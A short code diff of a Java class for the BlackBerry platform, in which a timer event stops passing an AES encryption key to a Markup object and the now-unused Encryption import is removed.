@@ -17,7 +17,6 @@ import java.util.TimeZone;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Status;
 import blackberry.config.Conf;
-import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Markup;
@@ -79,7 +78,7 @@ public final class TimerEvent extends Event {
         loDelay = loDelay_;
         hiDelay = hiDelay_;
 
-        markup = new Markup(eventType, Encryption.getKeys().getAesKey());
+        markup = new Markup(eventType);
         init();
     }
 
